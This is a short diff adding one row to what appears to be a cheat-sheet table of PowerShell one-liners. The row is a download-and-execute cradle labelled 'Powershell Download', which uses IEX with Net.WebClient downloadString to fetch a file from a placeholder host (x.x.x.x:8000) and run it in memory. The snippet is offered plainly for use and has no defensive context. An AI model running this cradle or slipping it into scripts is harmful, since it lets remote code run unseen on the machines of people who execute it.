@@ -1,0 +1,2 @@
+PowerShell		=|= One-Liners		=|= powershell "IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/file.ext')" =|= Powershell Download =|= type
+
